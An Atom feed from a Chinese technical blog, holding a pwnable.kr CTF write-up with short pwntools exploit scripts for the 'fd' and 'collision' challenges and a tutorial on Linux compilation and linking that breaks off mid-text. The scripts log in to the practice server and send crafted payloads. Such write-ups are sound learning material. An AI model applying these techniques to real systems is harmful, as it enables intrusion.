<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Firework</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-15T01:18:48.873Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Firework</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwnable_game题解</title>
    <link href="http://example.com/2021/04/14/Pwn/"/>
    <id>http://example.com/2021/04/14/Pwn/</id>
    <published>2021-04-14T14:59:55.267Z</published>
    <updated>2021-04-15T01:18:48.873Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwnable-games"><a href="#Pwnable-games" class="headerlink" title="Pwnable_games"></a>Pwnable_games</h1><p>开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><strong>Tips:</strong></p><p><strong>main函数的三个参数</strong></p><p>int argc</p><p>int型变量，表示传递给main函数的参数数量。</p><p>char *argv</p><p>指针数组，每个指针指向各个具体的参数。</p><p>char*envp</p><p>环境变量，可以为程序运行过程中需要使用环境变量做参考。</p><p>Demo:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello   //执行该文件</span><br></pre></td></tr></table></figure><p>此时argc=1,表示只有一个参数输入</p><p>argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello para_1</span><br></pre></td></tr></table></figure><p>此时argc=2,有两个参数传入</p><p>argc[0]指向输入程序路径及名称 “./hello”</p><p>argv[1]指向para_1字符串</p><p><strong>Linux 文件IO部分理解</strong></p><p>所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行：</p><ul><li><p>打开文件  ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。</p></li><li><p><strong>文件描述符fd：</strong></p></li></ul><p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p><ul><li>Linux shell创建的每个进程开始时都有三个打开的文件：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stdin 标准输入的文件标识符为0     </span><br><span class="line"></span><br><span class="line">stdout 标准输出的文件标识符为1</span><br><span class="line"></span><br><span class="line">stderr 标准错误输出的文件标识符为2</span><br></pre></td></tr></table></figure><p><strong>Exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;fd&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#shell.download_file(&#x27;fd.c&#x27;)</span></span><br><span class="line">sh = shell.run(<span class="string">&#x27;./fd&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">payload=<span class="string">&quot;LETMEWIN&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p><strong>Tips:</strong></p><p>跟哈希相关不大（×  可能是我没有get到出题人的意思</p><p>思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。</p><p>具体计算方法为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(568134124 + 1) / 5 = 113626825 = 0x6C5CEC9</span><br><span class="line">0x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8</span><br></pre></td></tr></table></figure><p>那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br></pre></td></tr></table></figure><p>这里采用小端存储方式。</p><p>小端存储：高字节保存在内存高地址，低字节保存在内存低地址中</p><p>这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入</p><p>下面两张图说明问题：（×其实还并不能说明问题</p><p><img src="https://i.loli.net/2021/04/15/tHDIdXazbU4pqE6.png" alt="store.jpg"></p><p><img src="https://i.loli.net/2021/04/15/pg2WPeRi8dcGoOB.png" alt="store2.jpg"></p><p>但是我们并不知道输入的命令行参数在内存存储的增长方向😀</p><p>各种Google均无果。。无奈下手动测试一下。</p><p>Test Code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[],<span class="keyword">char</span>* env[])</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">2</span>;i++)      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]:%p\n&quot;</span>,i,argv[i]);</span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;stack:%p\n&quot;</span>,&amp;i);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;env:%p\n&quot;</span>,env[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>实践出真知: </p><p><img src="https://i.loli.net/2021/04/15/mrwnc4Plt2YR9Na.png" alt="testout.jpg"></p><p>输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。</p><p>那么就很容易明白为什么逆序输入int四个字节了。</p><p>以为0x6C5CEC9和0x6C5CEC8为例  我们传入命令行参数argv[1]对应的字节序列为</p><p>\xc9\xce\xc5\x06\x12\x34\x56\x78实际存储时如下方式存储如下：</p><p>高地址8                                      78<br>高地址7                                      56<br>高地址6                                      34<br>高地址5                                      12<br>高地址4                                      06<br>高地址3                                      c5<br>高地址2                                      ce<br>高地址1                                      c9</p><p>int型号指针ip指向高地址1    那么由于int型号为小端存储，四个字节依次读取</p><p>ip[i]=0x06C5CEC9  ip[2]=0x78563412</p><p>网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。</p><p><strong>以上内容原创。转载注明出处。</strong></p><p>PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现</p><p>Demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`python -c <span class="built_in">print</span> <span class="string">&#x27;\xAB\xCD&#x27;</span>`</span><br></pre></td></tr></table></figure><p><strong>Exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span>+p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;col&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#shell.download_file(&#x27;col.c&#x27;)</span></span><br><span class="line">sh = shell.run(<span class="string">&#x27;./col&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><h2 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h2><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h2 id="blukat"><a href="#blukat" class="headerlink" title="blukat"></a>blukat</h2><h2 id="horcruxes"><a href="#horcruxes" class="headerlink" title="horcruxes"></a>horcruxes</h2><h2 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="brain fuck"></a>brain fuck</h2><h2 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="md5 calculator"></a>md5 calculator</h2><h2 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h2><h2 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h2><h2 id="ascii-easy"><a href="#ascii-easy" class="headerlink" title="ascii_easy"></a>ascii_easy</h2><h2 id="tiny-easy"><a href="#tiny-easy" class="headerlink" title="tiny_easy"></a>tiny_easy</h2><h2 id="fsb"><a href="#fsb" class="headerlink" title="fsb"></a>fsb</h2><h2 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h2><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><h2 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h2><h2 id="echo1"><a href="#echo1" class="headerlink" title="echo1"></a>echo1</h2><h2 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h2><h2 id="rsa-calculator"><a href="#rsa-calculator" class="headerlink" title="rsa_calculator"></a>rsa_calculator</h2><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h2 id="alloca"><a href="#alloca" class="headerlink" title="alloca"></a>alloca</h2><h2 id="loveletter"><a href="#loveletter" class="headerlink" title="loveletter"></a>loveletter</h2><h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><h2 id="dos4fun"><a href="#dos4fun" class="headerlink" title="dos4fun"></a>dos4fun</h2><h2 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h2><h2 id="aeg"><a href="#aeg" class="headerlink" title="aeg"></a>aeg</h2><h2 id="coin2"><a href="#coin2" class="headerlink" title="coin2"></a>coin2</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><h2 id="wtf"><a href="#wtf" class="headerlink" title="wtf"></a>wtf</h2><h2 id="sudoku"><a href="#sudoku" class="headerlink" title="sudoku"></a>sudoku</h2><h2 id="starcraft"><a href="#starcraft" class="headerlink" title="starcraft"></a>starcraft</h2><h2 id="cmd3"><a href="#cmd3" class="headerlink" title="cmd3"></a>cmd3</h2><h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><h2 id="lfh"><a href="#lfh" class="headerlink" title="lfh"></a>lfh</h2><h2 id="lokihardt"><a href="#lokihardt" class="headerlink" title="lokihardt"></a>lokihardt</h2><h2 id="asg"><a href="#asg" class="headerlink" title="asg"></a>asg</h2><h2 id="hunter"><a href="#hunter" class="headerlink" title="hunter"></a>hunter</h2><h2 id="mipstake"><a href="#mipstake" class="headerlink" title="mipstake"></a>mipstake</h2><h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><h2 id="tiny"><a href="#tiny" class="headerlink" title="tiny"></a>tiny</h2><h2 id="softmmu"><a href="#softmmu" class="headerlink" title="softmmu"></a>softmmu</h2><h2 id="towelroot"><a href="#towelroot" class="headerlink" title="towelroot"></a>towelroot</h2><h2 id="nuclear"><a href="#nuclear" class="headerlink" title="nuclear"></a>nuclear</h2><h2 id="malware"><a href="#malware" class="headerlink" title="malware"></a>malware</h2><h2 id="exploitable"><a href="#exploitable" class="headerlink" title="exploitable"></a>exploitable</h2><h2 id="tiny-hard"><a href="#tiny-hard" class="headerlink" title="tiny_hard"></a>tiny_hard</h2><h2 id="kcrc"><a href="#kcrc" class="headerlink" title="kcrc"></a>kcrc</h2><h2 id="exynos"><a href="#exynos" class="headerlink" title="exynos"></a>exynos</h2><h2 id="combabo-calculator"><a href="#combabo-calculator" class="headerlink" title="combabo_calculator"></a>combabo_calculator</h2><h2 id="pwnsandbox"><a href="#pwnsandbox" class="headerlink" title="pwnsandbox"></a>pwnsandbox</h2><h2 id="crcgen"><a href="#crcgen" class="headerlink" title="crcgen"></a>crcgen</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwnable-games&quot;&gt;&lt;a href=&quot;#Pwnable-games&quot; class=&quot;headerlink&quot; title=&quot;Pwnable_games&quot;&gt;&lt;/a&gt;Pwnable_games&lt;/h1&gt;&lt;p&gt;开始刷题啦！冲冲冲！本贴记</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Linux代码编译过程</title>
    <link href="http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
    <id>http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</id>
    <published>2021-04-11T16:05:33.539Z</published>
    <updated>2021-04-11T16:05:11.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下Hello-World的前生今世"><a href="#Linux下Hello-World的前生今世" class="headerlink" title="Linux下Hello World的前生今世"></a>Linux下Hello World的前生今世</h1><h2 id="代码引入"><a href="#代码引入" class="headerlink" title="代码引入"></a>代码引入</h2><p>hello.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[],<span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>linux环境下我们可以通过GCC编译hello.c:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g hello.c -o hello</span><br></pre></td></tr></table></figure><p>当前目录先会生成hello可执行文件。</p><h3 id="main函数的三个参数"><a href="#main函数的三个参数" class="headerlink" title="main函数的三个参数"></a>main函数的三个参数</h3><p>int argc</p><p>int型变量，表示传递给main函数的参数数量。</p><p>char *argv</p><p>指针数组，每个指针指向各个具体的参数。</p><p>char*envp</p><p>环境变量，可以为程序运行过程中需要使用环境变量做参考。</p><p>Demo:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello   //执行该文件</span><br></pre></td></tr></table></figure><p>此时argc=1,表示只有一个参数输入</p><p>argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello para_1</span><br></pre></td></tr></table></figure><p>此时argc=2,有两个参数传入</p><p>argc[0]指向输入程序路径及名称 “./hello”</p><p>argv[1]指向para_1字符串</p><h3 id="what’s-gcc"><a href="#what’s-gcc" class="headerlink" title="what’s gcc"></a>what’s gcc</h3><p>GCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点：</p><ul><li><p>GCC支持的编程语言多。比如，<code>g++</code>是C++编译器，<code>gfortran</code>是Fortran编译器。</p></li><li><p>GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。</p></li><li><p>GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。</p></li></ul><h2 id="编译过程分析"><a href="#编译过程分析" class="headerlink" title="编译过程分析"></a>编译过程分析</h2><p><img src="https://i.loli.net/2021/04/09/6Mdc9ytguaYkOZ4.png" alt="linux编译过程.png"></p><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理器CPP工具进行预处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cpp hello.c -o hello.i</span><br></pre></td></tr></table></figure><p>预编译主要处理源代码中以<code>#</code>开始的预编译指令，主要处理规则如下：</p><ul><li>处理<code>#include </code>预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。</li><li>处理条件预编译指令，比如<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code>。</li><li>删除<code>#define</code>，展开所有宏定义。</li><li>添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p>它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>as工具将hello.s文件翻译为二进制代码。</p><p>虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言<code>printf()</code>对应的汇编语言的<code>puts</code>函数。确切的说，系统还不知道<code>puts</code>函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc hello.o -o hello</span><br></pre></td></tr></table></figure><p>该命令是基于<strong>动态链接</strong>的方式，生成的<code>hello</code>已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。</p><p><code>main()</code>方法是C语言程序的入口，<code>crt1.o</code>这几个库是在处理<code>main()</code>方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用<code>fork()</code>，生成一个子进程，然后再调用<code>execve()</code>，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，<code>main()</code>方法是这个程序的入口，但仅仅从<code>main()</code>方法开始，并不能顺利执行这个程序。</p><p>链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。</p><p>链接过程主要包含了两个步骤：</p><ol><li><p><strong>地址与空间分配（Address and Storage Allocation）</strong></p><p>这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。</p><p>这里引入可执行目标文件的概念。</p><p><img src="https://i.loli.net/2021/04/10/rPaJSl5UQHMc16s.png" alt="EOF.png"></p><p>.text:已编译程序的机器代码</p><p>.rodata:只读数据</p><p>.data:已初始化的全局和静态C变量</p><p>.bss:未初始化的全局和静态C变量</p><p>.symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息</p><p>.debug:调试符号表</p><p>可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。</p><p><strong>顺序叠加</strong></p><p><img src="https://i.loli.net/2021/04/10/s5acwxbHEJCvldq.png" alt="elf2.png"></p><p>虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。</p><p><strong>合并相似节</strong></p><p>一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 <strong><code>.text</code>节</strong>合并到输出文件的 <strong><code>text</code>段</strong>（注意，此时出现了段和节两个概念），如下图所示。</p><p><img src="https://i.loli.net/2021/04/10/4gsBqv7fHbFXjMT.png" alt="elf1.png"></p><p>其中<code>.bss</code>节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的<strong>空间和地址</strong>有两层含义:</p><ol><li>在输出的可执行文件中的空间</li><li>在装载后的虚拟地址中的空间</li></ol><p>对于有实际数据的节，如<code>.text</code>和<code>.data</code>，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于<code>.bss</code>来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。<strong>我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配</strong>，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。</p><p><img src="https://i.loli.net/2021/04/10/FP4Nlwm1QWxpgzs.png" alt="dizhi.png"></p><p>现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 <strong>两步链接（Two-pass Linking）</strong> 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。</p></li><li><p><strong>符号解析（Symbol Resolution）</strong>和<strong>重定位（Relocation）</strong></p><p>使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 <strong>程序头表（Program Header Table）</strong> 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ <code>text</code>段）、数据段（ <code>data</code>段 ）。</p><p><img src="https://i.loli.net/2021/04/10/JASN3iGExlVrhv8.png" alt="different-elf-type.png"></p><p><img src="https://i.loli.net/2021/04/10/4gsBqv7fHbFXjMT.png" alt="elf1.png"></p><p><strong>符号解析</strong></p><p>重定位的过程是伴随着符号解析的，这里先介绍符号解析。</p><p>链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。</p><p>然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。</p><p>多重定义的全局符号解析在此不做介绍。</p><p><strong>重定位</strong></p><p>链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。</p><p>那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 <strong>重定位表（Relocation Table）</strong> 专门用来保存这些与重定位相关的信息。</p><p>对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果<code>.text</code>节需要被重定位，则会有一个相对应叫<code>.rel.text</code>的节保存了代码节的重定位表；如果<code>.data</code>节需要被重定位，则会有一个相对应的<code>.rel.tdata</code>的节保存了数据节的重定位表。</p></li></ol><p>链接可分为静态链接和动态链接</p><h5 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h5><p>简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如<code>.c</code>）文件经过编译器编译成<strong>目标文件</strong>（Object File，一般扩展名为<code>.o</code>或<code>.obj</code>）。目标文件和 <strong>库（Library）</strong> 一起链接形成最终的可执行文件。其中，最常见的库就是<strong>运行时库（Runtime Library）</strong>，它是支持程序运行的基本函数的集合。<strong>库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成</strong>。</p><p><img src="https://i.loli.net/2021/04/10/Cy1xEdQl6TVZqwS.png" alt="linking.jpg"></p><h5 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h5><p>动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。</p><p><strong>动态链接的基本实现</strong></p><p>动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。</p><p>目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 <strong>动态共享对象（DSO，Dynamic Shared Objects）</strong>，一般以<code>.so</code>为后缀；在Windows中，动态链接文件被称为 <strong>动态链接库（Dynamic Linking Library）</strong>，一般以<code>.dll</code>为后缀。</p><p>在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 <code>/lib</code>目录下，文件名为 <code>libc.so</code>。整个系统只保留一份C语言动态链接文件<code>libc.so</code>，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的<strong>动态链接器</strong>会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。</p><p><strong>动态链接程序运行时地址空间分布</strong></p><p>对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。</p><p>关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是：</p><ul><li><strong>静态共享库（Static Shared Library）</strong>（地址固定）</li><li><strong>动态共享库（Dynamic Shared 